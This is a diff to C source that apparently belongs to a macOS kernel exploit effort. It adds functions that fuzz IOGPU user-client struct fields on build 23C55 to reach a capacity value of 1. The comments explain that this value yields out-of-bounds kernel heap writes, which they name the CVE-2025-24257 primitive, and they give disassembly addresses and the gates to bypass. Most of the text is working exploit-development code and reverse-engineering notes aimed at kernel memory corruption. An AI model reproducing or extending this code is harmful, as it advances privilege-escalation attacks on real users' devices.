@@ -183,6 +183,67 @@ static void poc_exact_sweep(io_connect_t conn, uint32_t type)
     }
 }
 
+
+/* ------------------------------------------------------------------ */
+/* CAPACITY FIELD HUNT: which struct offset is the real capacity?        */
+/*                                                                       */
+/* Observed on 23C55: with struct[56]=1..63 the call answers            */
+/* kIOReturnNoResources, with struct[56]=64/128/4096 it succeeds.       */
+/* That looks like a `cmp w2,#0x3f` guard - but on WHICH field? If it   */
+/* is not the same field that ends up in (capacity>>6)-1, then setting  */
+/* the guarded field to 64 while the real capacity stays 1 gives the     */
+/* underflow directly, with no need for the growth path.                 */
+/*                                                                       */
+/* Method: for every candidate offset, set THAT field to 1 and every     */
+/* other candidate to 64. Whichever combination succeeds has found a     */
+/* field that is not capacity-guarded. Then set the capacity field to 1  */
+/* and see the group being created with a poisoned mask.                 */
+/* ------------------------------------------------------------------ */
+static void capacity_field_hunt(io_connect_t conn)
+{
+    static const uint32_t offs[] = { 8, 16, 24, 32, 40, 48, 56, 60, 64, 72, 80 };
+    static uint8_t in[0x400];
+    static uint8_t out[0x200];
+
+    ol("[hunt] capacity field hunt");
+    for (uint32_t oi = 0; oi < sizeof(offs)/sizeof(offs[0]); oi++) {
+        uint32_t off = offs[oi];
+        for (uint32_t variant = 0; variant < 2; variant++) {
+            /* variant 0: only this field = 1, rest of the candidates = 64
+               variant 1: this field = 64, the field at 56 = 1 */
+            memset(in, 0, sizeof(in));
+            memset(out, 0, sizeof(out));
+            uint64_t three = 3;
+            memcpy(in + 0, &three, 8);
+            uint64_t w27 = 1;
+            memcpy(in + 80, &w27, 8);
+            uintptr_t ap = (uintptr_t)g_args;
+            memcpy(in + 24, &ap, 8);
+            for (uint32_t oj = 0; oj < sizeof(offs)/sizeof(offs[0]); oj++) {
+                if (offs[oj] == 24 || offs[oj] == 80) continue;   /* ptr / gate */
+                uint64_t v = 64;
+                memcpy(in + offs[oj], &v, 8);
+            }
+            uint64_t one = 1;
+            if (variant == 0) memcpy(in + off, &one, 8);
+            else            memcpy(in + 56, &one, 8);
+
+            ofile("[hunt] CALL off=0x%x variant=%u", off, variant);
+            size_t on = sizeof(out);
+            kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, sizeof(in), out, &on);
+            g_calls++;
+            uint64_t grp = 0;
+            if (kr == 0) memcpy(&grp, out + 0x10, 8);
+            ol("[hunt] off=0x%x variant=%u -> kr=0x%x grp=0x%016llx",
+               off, variant, kr, (unsigned long long)grp);
+            if (kr == 0 && variant == 0) {
+                ol("[hunt] *** field at +0x%x accepts 1 while others are 64 -> "
+                   "it is NOT the capacity-guarded field", off);
+            }
+        }
+    }
+}
+
 void nk_iogpu_group_oob_run(int trigger)
 {
     nk_doc_log_open("group_oob.log");
@@ -261,6 +322,12 @@ void nk_iogpu_group_oob_run(int trigger)
         surf = IOSurfaceCreate(props);
         CFRelease(props); CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(pf);
         ol("[grp] IOSurface=%p global id=%u (%u surfaces)", (void *)surf, surf_id, nsurf);
+    }
+
+    if (trigger) {
+        /* First: find out which field the capacity guard really checks. */
+        capacity_field_hunt(conn);
+        ol("[grp] capacity field hunt done (calls=%u)", g_calls);
     }
 
     if (trigger) {
@@ -466,4 +533,243 @@ void nk_iogpu_group_oob_run(int trigger)
     }
     IOServiceClose(conn);
     ol("[grp] === done ===");
+}
+
+/* ------------------------------------------------------------------ */
+/* CAPACITY MATRIX - which field is the real capacity, and what gates it  */
+/*                                                                        */
+/* Static facts (23C55 IOGPUFamily):                                     */
+/*   group-info init 0x9f61200:  +0x20 = capacity, +0x28 = MASK          */
+/*                             (capacity>>6)-1, +0x2c = log2(capacity)   */
+/*   the bitmap word index is masked with MASK, and the element index is  */
+/*   bucket*64 + bit, where bucket = hash >> (64 - log2(capacity)).        */
+/*   For capacity == 1, log2 == 0 => the shift by 64 degenerates and the  */
+/*   bucket becomes the whole 64-bit hash => the element array write     */
+/*   lands up to 16 GB past a 4-byte kalloc, and the bitmap word RMW     */
+/*   lands up to 512 MB past the bitmap. That is the CVE-2025-24257      */
+/*   primitive. It needs capacity == 1 (any capacity with log2 > 0 keeps  */
+/*   the bucket inside the allocation).                                  */
+/*   init has exactly two callers: CREATE 0x9f60fcc and GROW 0x9f64910.  */
+/*   GROW re-inits with the SAME capacity (mov x1,x21 = x0->+0x20).       */
+/*   CREATE is reached with a HARDCODED capacity of 64 (0x9f614ac        */
+/*   mov w2,#64) - so the `cmp w2,#63` gate there is vacuous for us.      */
+/*   In the 2D path the capacity is ROUNDED UP: (cap+dim-1) & -dim       */
+/*   (0x9f4d328), so cap=1 would become 16384 there.                      */
+/*                                                                        */
+/* BASELINE (known good on 23C55): cmd=3, f56=64, f60=0, f64=0, f72=0,    */
+/* f80=1, in[24]=args ptr, every other byte zero. This matrix changes     */
+/* exactly ONE field per case, on a fresh connection.                     */
+/* ------------------------------------------------------------------ */
+#define CM_LOG(fmt, ...) nk_doc_log("cap_matrix.log", fmt, ##__VA_ARGS__)
+
+typedef struct {
+    uint64_t f56, f60, f64, f72, f80;
+} cm_args_t;
+
+static int cm_one(const char *tag, cm_args_t a)
+{
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                    IOServiceMatching("IOGPU"));
+    if (!svc) { CM_LOG("[cm] no IOGPU service"); return -1; }
+    io_connect_t conn = MACH_PORT_NULL;
+    for (uint32_t t = 0; t <= 40 && !conn; t++) {
+        io_connect_t c = MACH_PORT_NULL;
+        if (IOServiceOpen(svc, mach_task_self(), t, &c) == KERN_SUCCESS && c) {
+            conn = c;
+        }
+    }
+    if (!conn) { CM_LOG("[cm] no usable type"); return -1; }
+
+    static uint8_t in[STRUCT_SZ];
+    memset(in, 0, sizeof(in));
+    uint64_t c = CMD_NEW_GROUP;
+    memcpy(in + 0, &c, 8);
+    memcpy(in + 56, &a.f56, 8);
+    memcpy(in + 60, &a.f60, 8);
+    memcpy(in + 64, &a.f64, 8);
+    memcpy(in + 72, &a.f72, 8);
+    memcpy(in + 80, &a.f80, 8);
+    uintptr_t ap = (uintptr_t)g_args;
+    memcpy(in + 24, &ap, 8);
+
+    static uint8_t out[0x200];
+    size_t on = sizeof(out);
+    memset(out, 0, on);
+    kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, sizeof(in), out, &on);
+    uint64_t h = 0;
+    memcpy(&h, out + 0x10, 8);
+    CM_LOG("[cm] %s f56=%llu f60=%llu f64=%llu f72=%llu f80=%llu -> kr=0x%x grp=0x%llx %s",
+           tag, (unsigned long long)a.f56, (unsigned long long)a.f60,
+           (unsigned long long)a.f64, (unsigned long long)a.f72,
+           (unsigned long long)a.f80, kr, (unsigned long long)h,
+           (kr == 0) ? "*** ACCEPTED ***" : "");
+    IOServiceClose(conn);
+    return (int)kr;
+}
+
+static void cm_sweep(const char *tag, int which, const uint64_t *vals, size_t n)
+{
+    static const uint64_t base56 = 64, base60 = 0, base64 = 0, base72 = 0, base80 = 1;
+    for (size_t i = 0; i < n; i++) {
+        cm_args_t a = { base56, base60, base64, base72, base80 };
+        switch (which) {
+            case 0: a.f56 = vals[i]; break;
+            case 1: a.f60 = vals[i]; break;
+            case 2: a.f64 = vals[i]; break;
+            case 3: a.f72 = vals[i]; break;
+            case 4: a.f80 = vals[i]; break;
+            default: break;
+        }
+        cm_one(tag, a);
+    }
+}
+
+
+/* cmd=64 ("add a dimension to the group"): struct[56] = the capacity of the
+ * new dimension, struct[80] = the dimension size. The capacity is rounded
+ * UP to a multiple of the dimension: total = (cap + dim - 1) & -dim
+ * (0x9f4d328). If the dimension passes the "multiple of the limit" gate
+ * (tst (limit-1), dim) while being SMALL, the capacity survives the
+ * rounding - and capacity == 1 means log2(capacity) == 0, which degenerates
+ * the bucket shift in the insert path (0x9f62c04 lsr x9, x20, x9) into a
+ * shift by 0, i.e. the bucket becomes the full 64-bit hash and the bitmap
+ * access leaves the allocation. That is the CVE-2025-24257 primitive.
+ *
+ * The group info pointer lives in the session ([x22+80]), so this has to
+ * run on the SAME connection that created the group. */
+static int cm_dim(const char *tag, uint64_t cap, uint64_t dim, uint64_t f64,
+                  uint64_t f72)
+{
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                    IOServiceMatching("IOGPU"));
+    if (!svc) { CM_LOG("[cm] no IOGPU service"); return -1; }
+    io_connect_t conn = MACH_PORT_NULL;
+    for (uint32_t t = 0; t <= 40 && !conn; t++) {
+        io_connect_t c = MACH_PORT_NULL;
+        if (IOServiceOpen(svc, mach_task_self(), t, &c) == KERN_SUCCESS && c) {
+            conn = c;
+        }
+    }
+    if (!conn) { CM_LOG("[cm] no usable type"); return -1; }
+
+    /* step 1: create the group (cmd=3, resource type 64) */
+    static uint8_t in[STRUCT_SZ];
+    memset(in, 0, sizeof(in));
+    uint64_t c3 = CMD_NEW_GROUP;
+    memcpy(in + 0, &c3, 8);
+    uint64_t type64 = 64;
+    memcpy(in + 56, &type64, 8);
+    uint64_t one = 1;
+    memcpy(in + 80, &one, 8);
+    uintptr_t ap = (uintptr_t)g_args;
+    memcpy(in + 24, &ap, 8);
+    static uint8_t out[0x200];
+    size_t on = sizeof(out);
+    memset(out, 0, on);
+    kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, sizeof(in), out, &on);
+    uint64_t grp = 0;
+    memcpy(&grp, out + 0x10, 8);
+    CM_LOG("[cm] %s step1 create(type=64) -> kr=0x%x grp=0x%llx", tag, kr,
+           (unsigned long long)grp);
+    if (kr != 0) { IOServiceClose(conn); return (int)kr; }
+
+    /* step 2: cmd=64 with the candidate capacity/dimension */
+    memset(in, 0, sizeof(in));
+    uint64_t c64 = 64;
+    memcpy(in + 0, &c64, 8);
+    memcpy(in + 56, &cap, 8);
+    memcpy(in + 64, &f64, 8);
+    memcpy(in + 72, &f72, 8);
+    memcpy(in + 80, &dim, 8);
+    memcpy(in + 24, &ap, 8);
+    on = sizeof(out);
+    memset(out, 0, on);
+    kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, sizeof(in), out, &on);
+    CM_LOG("[cm] %s step2 cmd64 cap=%llu dim=%llu f64=%llu f72=%llu -> kr=0x%x %s",
+           tag, (unsigned long long)cap, (unsigned long long)dim,
+           (unsigned long long)f64, (unsigned long long)f72, kr,
+           (kr == 0) ? "*** ACCEPTED ***" : "");
+    IOServiceClose(conn);
+    return (int)kr;
+}
+
+void nk_iogpu_capacity_matrix(void)
+{
+    nk_doc_log_open("cap_matrix.log");
+    CM_LOG("[cm] === capacity matrix (23C55) baseline f56=64 f60=0 f64=0 f72=0 f80=1 ===");
+
+    /* phase A: the capacity field itself - the money phase */
+    static const uint64_t caps[] = { 1,2,3,4,5,6,7,8,16,32,63,64,65,96,127,128,
+                                     192,255,256,1000,1024,4096,65536,262144 };
+    CM_LOG("[cm] --- A: f56 (capacity) sweep ---");
+    cm_sweep("A", 0, caps, sizeof(caps)/sizeof(caps[0]));
+
+    /* phase B: the 4th u32 of the capacity word */
+    static const uint64_t v60[] = { 0,1,2,3,64,0xffffffff };
+    CM_LOG("[cm] --- B: f60 sweep ---");
+    cm_sweep("B", 1, v60, sizeof(v60)/sizeof(v60[0]));
+
+    /* phase C: f64 (the 2D / second-dimension field) */
+    static const uint64_t v64[] = { 0,1,2,3,64,4096,16384,65536,262144 };
+    CM_LOG("[cm] --- C: f64 sweep ---");
+    cm_sweep("C", 2, v64, sizeof(v64)/sizeof(v64[0]));
+
+    /* phase D: f72 */
+    static const uint64_t v72[] = { 0,1,2,3,64,4096,16384,65536 };
+    CM_LOG("[cm] --- D: f72 sweep ---");
+    cm_sweep("D", 3, v72, sizeof(v72)/sizeof(v72[0]));
+
+    /* phase E: f80 */
+    static const uint64_t v80[] = { 0,1,2,3,32,64,128,4096,16384,65536,262144 };
+    CM_LOG("[cm] --- E: f80 sweep ---");
+    cm_sweep("E", 4, v80, sizeof(v80)/sizeof(v80[0]));
+
+    /* phase F: small capacity with the 2D dimension set (the rounding path) */
+    CM_LOG("[cm] --- F: f56 sweep with f80=16384 ---");
+    {
+        static const uint64_t d[] = { 1,2,4,8,16,32,64,16384 };
+        for (size_t i = 0; i < sizeof(d)/sizeof(d[0]); i++) {
+            cm_args_t a = { d[i], 0, 0, 0, 16384 };
+            cm_one("F", a);
+        }
+    }
+
+    /* phase G: small capacity with f64 set (the 2D flag path) */
+    CM_LOG("[cm] --- G: f56 sweep with f64=16384 ---");
+    {
+        static const uint64_t d[] = { 1,2,4,8,16,32,64,16384 };
+        for (size_t i = 0; i < sizeof(d)/sizeof(d[0]); i++) {
+            cm_args_t a = { d[i], 0, 16384, 0, 1 };
+            cm_one("G", a);
+        }
+    }
+
+    /* phase H: cmd=64 - the dimension path. cap=1 with a small dim is the
+       only way left to get capacity == 1 past the rounding. */
+    CM_LOG("[cm] --- H: cmd=64 dimension path ---");
+    {
+        static const uint64_t dims[] = { 1,2,4,8,16,32,64,128,4096,16384 };
+        for (size_t i = 0; i < sizeof(dims)/sizeof(dims[0]); i++)
+            cm_dim("H", 1, dims[i], 0, 0);
+    }
+
+    /* phase I: cmd=64 with cap=1 and dim=1, varying the neighbours */
+    CM_LOG("[cm] --- I: cmd=64 cap=1 dim=1, f64/f72 sweep ---");
+    {
+        static const uint64_t vals[] = { 0,1,2,64,16384 };
+        for (size_t i = 0; i < sizeof(vals)/sizeof(vals[0]); i++)
+            cm_dim("I", 1, 1, vals[i], 0);
+        for (size_t i = 0; i < sizeof(vals)/sizeof(vals[0]); i++)
+            cm_dim("I", 1, 1, 0, vals[i]);
+    }
+
+    /* phase J: cmd=64, dim=1, capacity sweep */
+    CM_LOG("[cm] --- J: cmd=64 dim=1, capacity sweep ---");
+    {
+        static const uint64_t caps2[] = { 1,2,4,8,16,32,64,128,256 };
+        for (size_t i = 0; i < sizeof(caps2)/sizeof(caps2[0]); i++)
+            cm_dim("J", caps2[i], 1, 0, 0);
+    }
+
+    CM_LOG("[cm] === capacity matrix done ===");
 }
